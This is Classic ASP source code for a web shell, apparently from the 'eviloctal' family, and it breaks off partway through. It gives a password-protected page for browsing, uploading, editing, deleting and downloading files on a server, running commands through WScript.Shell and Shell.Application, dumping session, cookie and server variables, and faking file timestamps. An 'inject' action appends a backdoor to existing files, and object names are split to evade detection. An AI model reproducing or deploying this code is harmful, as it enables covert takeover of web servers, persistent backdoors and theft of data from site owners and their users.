<%

	Dim theAct, sTime, aspPath, eviloctal, strBackDoor, fsoX, saX, wsX

	sTime = Timer
	theAct= Request("theAct")
	eviloctal = Request("eviloctal")
	aspPath = Server.MapPath(".")
							
	
	Const m = "eviloctal"	
	Const showLogin = "study"	
	Const clientPassword = "#"
	Const dbSelectNumber = 10
	Const isDebugMode = False
	Const myName = "GET IN"
	Const notdownloadsExists = False
	Const userPassword = "eviloctal"
	Const MyCmdDoTExeFiLe = "cOmmaNd.coM"
	ConSt strJSCloSeMe = "<inPut tYpe=butTon vAluE=' �ر� ' onClick='wiNdow.cloSe();'>"

	Sub creAteIT(fSoX, SaX, wSX)
		If isDebugMode = False Then
			On Error Resume Next
		End If

		Set fsoX = Server.CreateObject("Scripting.FileSy"&x&"stemObject")
		If IsEmpty(fsoX) And (eviloctal = "FsoFile"&x&"Explorer" Or theAct = "fsoSe"&x&"arch") Then
			Set fsoX = fso
		End If

		Set saX = Server.CreateObject("Shell.Ap"&x&"plication")
		If IsEmpty(saX) And (eviloctal = "AppFileExplorer" Or eviloctal = "Sa"&x&"CmdRun" Or theAct = "saSe"&x&"arch") Then
			Set saX = sa
		End If

		Set wsX = Server.CreateObject("WScrip"&x&"t.Shell")
		If IsEmpty(wsX) And (eviloctal = "WsCm"&x&"dRun" Or theAct = "getTermina"&x&"lInfo" Or theAct = "readR"&x&"eg") Then
			Set wsX = ws
		End If

		If Err Then
			Err.Clear
		End If
	End Sub

	Sub chkErr(Err)
		If Err Then
			echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"
			echo "<br/><font size=2><li>����: " & Err.Description & "</li><li>����Դ: " & Err.Source & "</li><br/>"
			echo "<hr></font>"
			Err.Clear
			Response.End
		End If
	End Sub
	
	Sub echo(str)
		Response.Write(str)
	End Sub
	
	Sub isIn()
		If eviloctal <> "" And eviloctal <> "login" And eviloctal <> showLogin Then
			If Session(m & "userPassword") <> userPassword Then
				Response.End
			End If
		End If
	End Sub
	
	Sub showTitle(str)
		echo "<title>" & str & " </title>" & vbNewLine
		echo "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbNewLine
		echo "" & vbNewLine
		PageOther()
	End Sub
	
	Function fixNull(str)
		If IsNull(str) Then
			str = " "
		End If
		fixNull = str
	End Function
	
	Function encode(str)
		str = Server.HTMLEncode(str)
		str = Replace(str, vbNewLine, "<br>")
		str = Replace(str, " ", "&nbsp;")
		str = Replace(str, "	", "&nbsp;&nbsp;&nbsp;&nbsp;")
		encode = str
	End Function
	
	Function getTheSize(theSize)
		If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G"
		If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M"
		If theSize >= 1024 And theSize < (1024 * 1024) Then getTheSize = Fix((theSize / 1024) * 100) / 100 & "K"
		If theSize >= 0 And theSize <1024 Then getTheSize = theSize & "B"
	End Function
	
	Function HtmlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		HtmlEncode = Server.HTMLEncode(str)
	End Function
	
	Function UrlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		UrlEncode = Server.UrlEncode(str)
	End Function
	
	Sub redirectTo(strUrl)
		Response.Redirect(Request.ServerVariables("URL") & strUrl)
	End Sub

	Function trimThePath(strPath)
		If Right(strPath, 1) = "\" And Len(strPath) > 3 Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		trimThePath = strPath
	End Function

	Sub alertThenClose(strInfo)
		Response.Write "<script>alert(""" & strInfo & """);window.close();</script>"
	End Sub

	Sub showErr(str)
		Dim i, arrayStr
		str = Server.HtmlEncode(str)
		arrayStr = Split(str, "$$")
'		Response.Clear
		echo "<font size=2>"
		echo "������Ϣ:<br/><br/>"
		For i = 0 To UBound(arrayStr)
			echo "&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "<br/>"
		Next
		echo "</font>"
		Response.End
	End Sub



	isIn()
	
	Call createIt(fsoX, saX, wsX)

	Select Case eviloctal
		Case showLogin, "login"
			PageLogin()
		Case "PageList"
			PageList()
		Case "objOnSrv"
			PageObjOnSrv()
		Case "ServiceList"
			PageServiceList()
		Case "userList"
			PageUserList()
		Case "CSInfo"
			PageCSInfo()
		Case "infoAboutSrv"
			PageInfoAboutSrv()
		Case "AppFileExplorer"
			PageAppFileExplorer()
		Case "SaCmdRun"
			PageSaCmdRun()
		Case "WsCmdRun"
			PageWsCmdRun()
		Case "FsoFileExplorer"
			PageFsoFileExplorer()
		Case "MsDataBase"
			PageMsDataBase()
		Case "OtherTools"
			PageOtherTools()
		Case "TxtSearcher"
			PageTxtSearcher()
		Case "PageAddToMdb"
			PageAddToMdb()
		Case "mycom"
			mycom()
	End Select
	
	Set saX = Nothing
	Set wsX = Nothing
	Set fsoX = Nothing

	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	Rem 	�����Ǹ���������ģ��
	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

	Sub PageAppFileExplorer()
		Response.Buffer = True
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
		Dim intI, theAct, strTmp, strFolderList, strFileList, strFilePath, strFileName, strParentPath

		showTitle("She"&T&"ll.Appl"&T&"ication�ļ������(&stream)")

		theAct = Request("theAct")
		strNewName = Request("newName")
		thePath = Replace(LTrim(Request("thePath")), "\\", "\")
		
		If theAct <> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Replace(LTrim(Request.Form("thePath")), "\\", "\")
			End If
		End If

		echo "<style>body{margin:8;}</style>"
		
		Select Case theAct
			Case "openUrl"
				openUrl(thePath)
			Case "showEdit"
				Call showEdit(thePath, "stream")
			Case "saveFile"
				Call saveToFile(thePath, "stream")
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("��������!")
					Response.End
				End If
				Session(m & "appThePath") = thePath
				Session(m & "appTheAct") = theAct
				alertThenClose("�����ɹ�,��ճ��!")
			Case "pastOne"
				appDoPastOne(thePath)
				alertThenClose("ճ���ɹ�,��ˢ�±�ҳ�鿴Ч��!")
			Case "rename"
				appRenameOne(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "theAttributes"
				appTheAttributes(thePath)
			Case "showUpload"
				Call showUpload(thePath, "AppFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "AppFileExplorer")
			Case "inject"
				strTmp = streamLoadFromFile(thePath)
				fsoSaveToFile thePath, strTmp & strBackDoor
				alertThenClose("����ɹ�!")
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		
		Set objFolder = saX.NameSpace(thePath)
		
		If Request.Form.Count > 0 Then
			redirectTo("?eviloctal=AppFileExplorer&thePath=" & UrlEncode(thePath))
		End If
		echo "<input type=hidden name=usePath /><input type=hidden value=AppFileExplorer name=eviloctal />"
		echo "<input type=hidden value=""" & HtmlEncode(thePath) & """ name=truePath />"
		echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "<input type=button value=' �� ' onclick='openUrl();'>"
		echo "<input type=button value=' �༭ ' onclick='editFile();'>"
		echo "<input type=button value=' ���� ' onclick=appDoAction('copyOne');>"
		echo "<input type=button value=' ���� ' onclick=appDoAction('cutOne');>"
		echo "<input type=button value=' ճ�� ' onclick=appDoAction2('pastOne');>"
		echo "<input type=button value=' �ϴ� ' onclick='upTheFile();'>"
		echo "<input type=button value=' ���� ' onclick='downTheFile();'>"
		echo "<input type=button value=' ���� ' onclick='appTheAttributes();'>"
		echo "<input type=button value=' ���� ' onclick=appDoAction('inject');>"
		echo "<input type=button value='������' onclick='appRename();'>"
		echo "<input type=button value='�ҵĵ���' onclick=location.href='?eviloctal=AppFileExplorer&thePath='>"
		echo "<input type=button value='�������' onclick=location.href='?eviloctal=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'>"
		echo "<form method=post action='?eviloctal=AppFileExplorer'>"
		echo "<input type=button value=' ���� ' onclick='this.disabled=true;history.back();' />"
		echo "<input type=button value=' ǰ�� ' onclick='this.disabled=true;history.go(1);' />"
		echo "<input type=button value=վ��� onclick=location.href=""?eviloctal=AppFileExplorer&thePath=" & URLEncode(Server.MapPath("\")) & """;>"
		echo "<input style='width:60%;' name=thePath value=""" & HtmlEncode(thePath) & """ />"
		echo "<input type=submit value=' GO.' /><input type=button value=' ˢ�� ' onclick='location.reload();'></form><hr/>"
		echo "</div><div style='height:50px;'></div>"
		echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

		For Each objMember In objFolder.Items
			intI = intI + 1
			If intI > 200 Then
				intI = 0
				Response.Flush()
			End If
			
			If objMember.IsFolder = True Then
				If Left(objMember.Path, 2) = "::" Then
					strPath = URLEncode(objMember.Path)
				 Else
					strPath = URLEncode(objMember.Path) & "%5C"
				End If
				strFolderList = strFolderList & "<span id=""" & strPath & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>" & objMember.Name & "</span>"
			 Else
			 	strDetails = objFolder.GetDetailsOf(objMember, -1)
			 	strFilePath = objMember.Path
				strFileName = Mid(strFilePath, InStrRev(strFilePath, "\") + 1)
				strExtName = Split(strFileName, ".")(UBound(Split(strFileName, ".")))
				strFileList = strFileList & "<span title=""" & strDetails & """ ondblclick='openUrl();' id=""" & URLEncode(strFilePath) & """ onclick='changeMyClass(this);'><font class=font face=" & getFileIcon(strExtName) & "</font><br/>" & strFileName & "</span>"
			End If
		Next
		chkErr(Err)

		strParentPath = getParentPath(thePath)
		If thePath <> "" And Left(thePath, 2) <> "::" Then
			strFolderList = "<span id=""" & URLEncode(strParentPath) & """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'><font class=font face=Wingdings>0</font><br/>..</span>" & strFolderList
		End If

		echo "<div id=FileList>"
		echo strFolderList & strFileList
		echo "</div>"
		echo "<hr/>"
		
		Set objFolder = Nothing
	End Sub
	
	Function getParentPath(strPath)
		If Right(strPath, 1) = "\" Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		If Len(strPath) = 2 Then
			getParentPath = " "
		 Else
			getParentPath = Left(strPath, InStrRev(strPath, "\"))
		End If
	End Function

	Function streamSaveToFile(thePath, fileContent)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			chkErr(Err)
			.Charset="gb2312"
			.WriteText fileContent
			.saveToFile thePath, 2
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub appDoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strAct, strPath
		dim objTargetFolder
		strAct = Session(m & "appTheAct")
		strPath = Session(m & "appThePath")
		
		If strAct = "" Or strPath = "" Then
			alertThenClose("��������,ճ��ǰ���ȸ���/����!")
			Exit Sub
		End If
		
		If InStr(LCase(thePath), LCase(strPath)) > 0 Then
			alertThenClose("Ŀ���ļ�����Դ�ļ�����,�Ƿ�����!")
			Exit Sub
		End If

		strPath = trimThePath(strPath)
		thePath = trimThePath(thePath)

		Set objTargetFolder = saX.NameSpace(thePath)
		If strAct = "copyOne" Then
			objTargetFolder.CopyHere(strPath)
		 Else
			objTargetFolder.MoveHere(strPath)
		End If
		chkErr(Err)
		
		Set objTargetFolder = Nothing
	End Sub
	
	Sub appTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, strSth, objFolder, objItem, strModifyDate
		strModifyDate = Request("ModifyDate")
		
		thePath = trimThePath(thePath)

		If thePath = "" Then
			alertThenClose("û��ѡ���κ��ļ�(��)!")
			Exit Sub
		End If

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = saX.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)

		If isDate(strModifyDate) Then
			objItem.ModifyDate = strModifyDate
			alertThenClose("�޸ĳɹ�!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
'		strSth = objFolder.GetDetailsOf(objItem, -1)
'		strSth = Replace(strSth, chr(10), "<br/>")
		For i = 1 To 8
			strSth = strSth & "<br/>����(" & i & "): " & objFolder.GetDetailsOf(objItem, i)
		Next
		strSth = Replace(strSth, "����(1)", "��С")
		strSth = Replace(strSth, "����(2)", "����")
		strSth = Replace(strSth, "����(3)", "����޸�")
		strSth = Replace(strSth, "����(8)", "������")
		strSth = strSth & "<form method=post>"
		strSth = strSth & "<input type=hidden name=theAct value=theAttributes>"
		strSth = strSth & "<input type=hidden name=thePath value=""" & thePath & """>"
		strSth = strSth & "<br/>����޸�: <input size=30 value='" & objFolder.GetDetailsOf(objItem, 3) & "' name=ModifyDate />"
		strSth = strSth & "<input type=submit value=' �޸� '>"
		strSth = strSth & "</form>"
		echo strSth
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub
	
	Sub appRenameOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strSth, fileName, objItem, objFolder
		fileName = Request("fileName")
		
		thePath = trimThePath(thePath)

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = saX.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)
		strSth = Split(thePath, ".")(UBound(Split(thePath, ".")))
		
		If fileName <> "" Then
			objItem.Name = fileName
			chkErr(Err)
			alertThenClose("�������ɹ�,ˢ�±�ҳ���Կ���Ч��!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
		echo "<form method=post>������:"
		echo "<input type=hidden name=theAct value=rename>"
		echo "<input type=hidden name=thePath value=""" & thePath & """>"
		echo "<br/><input size=30 value=""" & objItem.Name & """ name=fileName />"
		If InStr(strSth, ":") <= 0 Then
			echo "." & strSth
		End If
		echo "<hr/><input type=submit value=' �޸� '>" & strJsCloseMe
		echo "</form>"
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub

	Sub PageCSInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strKey, strVar, strVariable
		
		showTitle("�ͻ��˷�����������Ϣ")
		
		echo "<a href=javascript:showHideMe(ServerVariables);>ServerVariables:</a>"
		echo "<span id=ServerVariables style='display:none;'>"
		For Each strVariable In Request.ServerVariables
			echo "<li>" & strVariable & ": " & Request.ServerVariables(strVariable) & "</li>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(Application);>Application:</a>"
		echo "<span id=Application style='display:none;'>"
		For Each strVariable In Application.Contents
			echo "<li>" & strVariable & ": " & Encode(Application(strVariable)) & "</li>"
			If Err Then
				For Each strVar In Application.Contents(strVariable)
					echo "<li>" & strVariable & "(" & strVar & "): " & Encode(Application(strVariable)(strVar)) & "</li>"
				Next
				Err.Clear
			End If
		Next
		echo "</span>"

		echo "<br/><a href=javascript:showHideMe(Session);>Session:(ID" & Session.SessionId & ")</a>"
		echo "<span id=Session style='display:none;'>"
		For Each strVariable In Session.Contents
			echo "<li>" & strVariable & ": " & Encode(Session(strVariable)) & "</li>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(Cookies);>Cookies:</a>"
		echo "<span id=Cookies style='display:none;'>"
		For Each strVariable In Request.Cookies
			If Request.Cookies(strVariable).HasKeys Then
				For Each strKey In Request.Cookies(strVariable)
					echo "<li>" & strVariable & "(" & strKey & "): " & HtmlEncode(Request.Cookies(strVariable)(strKey)) & "</li>"
				Next
			 Else
				echo "<li>" & strVariable & ": " & Encode(Request.Cookies(strVariable)) & "</li>"
			End If
		Next
		echo "</span><hr/>"
		
	End Sub

	Sub PageFsoFileExplorer()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Response.Buffer = True
		Dim file, drive, folder, theFiles, theFolder, theFolders
		Dim i, theAct, strTmp, driveStr, thePath, parentFolderName
		
		theAct = Request("theAct")
		thePath = Request("thePath")
		If theAct <> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Request.Form("thePath")
			End If
		End If

		showTitle("FSO�ļ������(&stream)")
		
		Select Case theAct
			Case "newOne", "doNewOne"
				fsoNewOne(thePath)
			Case "showEdit"
				Call showEdit(thePath, "fso")
			Case "saveFile"
				Call saveToFile(thePath, "fso")
			Case "openUrl"
				openUrl(thePath)
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("��������!")
					Response.End
				End If
				Session(m & "fsoThePath") = thePath
				Session(m & "fsoTheAct") = theAct
				alertThenClose("�����ɹ�,��ճ��!")
			Case "pastOne"
				fsoPastOne(thePath)
				alertThenClose("ճ���ɹ�,��ˢ�±�ҳ�鿴Ч��!")
			Case "showFsoRename"
				showFsoRename(thePath)
			Case "doRename"
				Call fsoRename(thePath)
				alertThenClose("�������ɹ�,ˢ�º���Կ���Ч��!")
			Case "delOne", "doDelOne"
				showFsoDelOne(thePath)
			Case "getAttributes", "doModifyAttributes"
				fsoTheAttributes(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "showUpload"
				Call showUpload(thePath, "FsoFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "FsoFileExplorer")
			Case "inject"
				Set theFiles = fsoX.OpenTextFile(thePath)
				strTmp = theFiles.ReadAll()
				fsoSaveToFile thePath, strTmp & strBackDoor
				Set theFiles = Nothing
				alertThenClose("����ɹ�!")
		End Select
		
		If theAct <> "" Then
			Response.End
		End If
		
		If Request.Form.Count > 0 Then
			redirectTo("?eviloctal=FsoFileExplorer&thePath=" & UrlEncode(thePath))
		End If
		
		parentFolderName = fsoX.GetParentFolderName(thePath)
		
		echo "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "<input type=button value=' �½� ' onclick=newOne();>"
		echo "<input type=button value=' ���� ' onclick=fsoRename();>"
		echo "<input type=button value=' �༭ ' onclick=editFile();>"
		echo "<input type=button value=' �� ' onclick=openUrl();>"
		echo "<input type=button value=' ���� ' onclick=appDoAction('copyOne');>"
		echo "<input type=button value=' ���� ' onclick=appDoAction('cutOne');>"
		echo "<input type=button value=' ճ�� ' onclick=appDoAction2('pastOne')>"
		echo "<input type=button value=' ���� ' onclick=fsoGetAttributes();>"
		echo "<input type=button value=' ���� ' onclick=appDoAction('inject');>"
		echo "<input type=button value=' ɾ�� ' onclick=delOne();>"
		echo "<input type=button value=' �ϴ� ' onclick='upTheFile();'>"
		echo "<input type=button value=' ���� ' onclick='downTheFile();'>"
		echo "<br/>"
		echo "<input type=hidden value=FsoFileExplorer name=eviloctal />"
		echo "<input type=hidden value=""" & UrlEncode(thePath) & """ name=truePath>"
		echo "<input type=hidden size=50 name=usePath>"

		echo "<form method=post action=?eviloctal=FsoFileExplorer>"
		If parentFolderName <> "" Then
			echo "<input value='������' type=button onclick=""this.disabled=true;location.href='?eviloctal=FsoFileExplorer&thePath=" & Server.UrlEncode(parentFolderName) & "';"">"
		End If
		echo "<input type=button value=' ���� ' onclick='this.disabled=true;history.back();' />"
		echo "<input type=button value=' ǰ�� ' onclick='this.disabled=true;history.go(1);' />"
		echo "<input size=60 value=""" & HtmlEncode(thePath) & """ name=thePath>"
		echo "<input type=submit value=' ת�� '>"
		driveStr = "<option>�̷�</option>"
		driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath(".")) & "'>.</option>"
		driveStr = driveStr & "<option value='" & HtmlEncode(Server.MapPath("/")) & "'>/</option>"
		For Each drive In fsoX.Drives
			driveStr = driveStr & "<option value='" & drive.DriveLetter & ":\'>" & drive.DriveLetter & ":\</option>"
		Next
		echo "<input type=button value=' ˢ�� ' onclick='location.reload();'> "
		echo "<select onchange=""this.form.thePath.value=this.value;this.form.submit();"">" & driveStr & "</select>"
		echo "<hr/></form>"
		echo "</div><div style='height:50px;'></div>"
		echo "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"

		If fsoX.FolderExists(thePath) = False Then
			showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
		End If
		Set theFolder = fsoX.GetFolder(thePath)
		Set theFiles = theFolder.Files
		Set theFolders = theFolder.SubFolders

		echo "<div id=FileList>"
		For Each folder In theFolders
			i = i + 1
			If i > 50 Then
				i = 0
				Response.Flush()
			End If
			strTmp = UrlEncode(folder.Path & "\")
			echo "<span id='" & strTmp & "' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);><font class=font face=Wingdings>0</font><br/>" & folder.Name & "</span>" & vbNewLine
		Next
		Response.Flush()
		For Each file In theFiles
			i = i + 1
			If i > 100 Then
				i = 0
				Response.Flush()
			End If
			echo "<span id='" & UrlEncode(file.Path) & "' title='����: " & file.Type & vbNewLine & "��С: " & getTheSize(file.Size) & "' onDblClick=""openUrl();"" onclick=changeMyClass(this);><font class=font face=" & getFileIcon(fsoX.GetExtensionName(file.Name)) & "</font><br/>" & file.Name & "</span>" & vbNewLine
		Next
		echo "</div>"
		chkErr(Err)
		
		echo "<hr/>"
	End Sub
	
	Sub fsoNewOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theAct, isFile, theName, newAct
		isFile = Request("isFile")
		newAct = Request("newAct")
		theName = Request("theName")

		If newAct = " ȷ�� " Then
			thePath = Replace(thePath & "\" & theName, "\\", "\")
			If isFile = "True" Then
				Call fsoX.CreateTextFile(thePath, False)
			 Else
				fsoX.CreateFolder(thePath)
			End If
			chkErr(Err)
			alertThenClose("�ļ�(��)�½��ɹ�,ˢ�º�Ϳ��Կ���Ч��!")
			Response.End
		End If
		
		echo "<style>body{overflow:hidden;}</style>"
		echo "<body topmargin=2>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>�½�: "
		echo "<input type=radio name=isFile id=file value='True' checked><label for=file>�ļ�</label> "
		echo "<input type=radio name=isFile id=folder value='False'><label for=folder>�ļ���</label><br/>"
		echo "<input size=38 name=theName><hr/>"
		echo "<input type=hidden name=theAct value=doNewOne>"
		echo "<input type=submit name=newAct value=' ȷ�� '>" & strJsCloseMe
		echo "</form>"
		echo "</body><br/>"
	End Sub
	
	Sub fsoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim sessionPath
		sessionPath = Session(m & "fsoThePath")
		
		If thePath = "" Or sessionPath = "" Then
			alertThenClose("��������!")
			Response.End
		End If
		
		If Right(thePath, 1) = "\" Then
			thePath = Left(thePath, Len(thePath) - 1)
		End If
		
		If Right(sessionPath, 1) = "\" Then
			sessionPath = Left(sessionPath, Len(sessionPath) - 1)
			If Session(m & "fsoTheAct") = "cutOne" Then
				Call fsoX.MoveFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			 Else
				Call fsoX.CopyFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			End If
		 Else
			If Session(m & "fsoTheAct") = "cutOne" Then
				Call fsoX.MoveFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			 Else
				Call fsoX.CopyFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
			End If
		End If
		
		chkErr(Err)
	End Sub
	
	Sub fsoRename(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, fileName, theFolder
		fileName = Request("fileName")
		
		If thePath = "" Or fileName = "" Then
			alertThenClose("��������!")
			Response.End
		End If

		If Right(thePath, 1) = "\" Then
			Set theFolder = fsoX.GetFolder(thePath)
			theFolder.Name = fileName
			Set theFolder = Nothing
		 Else
			Set theFile = fsoX.GetFile(thePath)
			theFile.Name = fileName
			Set theFile = Nothing
		End If
		
		chkErr(Err)
	End Sub
	
	Sub showFsoRename(thePath)
		Dim theAct, fileName
		fileName = fsoX.getFileName(thePath)
		
		echo "<style>body{overflow:hidden;}</style>"
		echo "<body topmargin=2>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """><br/>����Ϊ:<br/>"
		echo "<input size=38 name=fileName value=""" & HtmlEncode(fileName) & """><hr/>"
		echo "<input type=submit value=' ȷ�� '>"
		echo "<input type=hidden name=theAct value=doRename>"
		echo "<input type=button value=' �ر� ' onclick='window.close();'>"
		echo "</form>"
		echo "</body><br/>"
	End Sub
	
	Sub showFsoDelOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile
		newAct = Request("newAct")

		If newAct = "ȷ��ɾ��?" Then
			If Right(thePath, 1) = "\" Then
				thePath = Left(thePath, Len(thePath) - 1)
				Call fsoX.DeleteFolder(thePath, True)
			 Else
				Call fsoX.DeleteFile(thePath, True)
			End If
			chkErr(Err)
			alertThenClose("�ļ�(��)ɾ���ɹ�,ˢ�º�Ϳ��Կ���Ч��!")
			Response.End
		End If

		echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"		
		echo "<form method=post><br/>"
		echo HtmlEncode(thePath)
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doDelOne>"
		echo "<hr/><input type=submit name=newAct value='ȷ��ɾ��?'><input type=button value=' �ر� ' onclick='window.close();'>"
		echo "</form>"
	End Sub
	
	Sub fsoTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim newAct, theFile, theFolder, theTitle
		newAct = Request("newAct")
		
		If Right(thePath, 1) = "\" Then
			Set theFolder = fsoX.GetFolder(thePath)
			If newAct = " �޸� " Then
				setMyTitle(theFolder)
			End If
				theTitle = getMyTitle(theFolder)
			Set theFolder = Nothing
		 Else
			Set theFile = fsoX.GetFile(thePath)
			If newAct = " �޸� " Then
				setMyTitle(theFile)
			End If
			theTitle = getMyTitle(theFile)
			Set theFile = Nothing
		End If
		
		chkErr(Err)
		theTitle = Replace(theTitle, vbNewLine, "<br/>")
		echo "<style>body{margin:8;overflow:hidden;}</style>"
		echo "<form method=post>"
		echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
		echo "<input type=hidden name=theAct value=doModifyAttributes>"
		echo theTitle
		echo "<hr/><input type=submit name=newAct value=' �޸� '>" & strJsCloseMe
		echo "</form>"
	End Sub
	
	Function getMyTitle(theOne)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strTitle
		strTitle = strTitle & "·��: " & theOne.Path & "" & vbNewLine
		strTitle = strTitle & "��С: " & getTheSize(theOne.Size) & vbNewLine
		strTitle = strTitle & "����: " & getAttributes(theOne.Attributes) & vbNewLine
		strTitle = strTitle & "����ʱ��: " & theOne.DateCreated & vbNewLine
		strTitle = strTitle & "����޸�: " & theOne.DateLastModified & vbNewLine
		strTitle = strTitle & "������: " & theOne.DateLastAccessed
		getMyTitle = strTitle
	End Function
	
	Sub setMyTitle(theOne)
		Dim i, myAttributes
		
		For i = 1 To Request("attributes").Count
			myAttributes = myAttributes + CInt(Request("attributes")(i))
		Next
		theOne.Attributes = myAttributes
		
		chkErr(Err)
		echo  "<script>alert('���ļ�(��)�����Ѱ���ȷ�����޸����!');</script>"
	End Sub
	
	Function getAttributes(intValue)
		Dim strAtt
		strAtt = "<input type=checkbox name=attributes value=4 {$system}>ϵͳ "
		strAtt = strAtt & "<input type=checkbox name=attributes value=2 {$hidden}>���� "
		strAtt = strAtt & "<input type=checkbox name=attributes value=1 {$readonly}>ֻ��&nbsp;&nbsp;&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=32 {$archive}>�浵<br/>����&nbsp; "
		strAtt = strAtt & "<input type=checkbox name=attributes {$normal} value=0>��ͨ "
		strAtt = strAtt & "<input type=checkbox name=attributes value=128 {$compressed}>ѹ�� "
		strAtt = strAtt & "<input type=checkbox name=attributes value=16 {$directory}>�ļ���&nbsp;"
		strAtt = strAtt & "<input type=checkbox name=attributes value=64 {$alias}>��ݷ�ʽ"
'		strAtt = strAtt & "<input type=checkbox name=attributes value=8 {$volume}>��� "
		If intValue = 0 Then
			strAtt = Replace(strAtt, "{$normal}", "checked")
		End If
		If intValue >= 128 Then
			intValue = intValue - 128
			strAtt = Replace(strAtt, "{$compressed}", "checked")
		End If
		If intValue >= 64 Then
			intValue = intValue - 64
			strAtt = Replace(strAtt, "{$alias}", "checked")
		End If
		If intValue >= 32 Then
			intValue = intValue - 32
			strAtt = Replace(strAtt, "{$archive}", "checked")
		End If
		If intValue >= 16 Then
			intValue = intValue - 16
			strAtt = Replace(strAtt, "{$directory}", "checked")
		End If
		If intValue >= 8 Then
			intValue = intValue - 8
			strAtt = Replace(strAtt, "{$volume}", "checked")
		End If
		If intValue >= 4 Then
			intValue = intValue - 4
			strAtt = Replace(strAtt, "{$system}", "checked")
		End If
		If intValue >= 2 Then
			intValue = intValue - 2
			strAtt = Replace(strAtt, "{$hidden}", "checked")
		End If
		If intValue >= 1 Then
			intValue = intValue - 1
			strAtt = Replace(strAtt, "{$readonly}", "checked")
		End If
		getAttributes = strAtt
	End Function

	Sub PageInfoAboutSrv()
		Dim theAct
		theAct = Request("theAct")
		
		showTitle("�������������")
		
		Select Case theAct
			Case ""
				getSrvInfo()
				getSrvDrvInfo()
				getSiteRootInfo()
				getTerminalInfo()
			Case "getSrvInfo"
				getSrvInfo()
			Case "getSrvDrvInfo"
				getSrvDrvInfo()
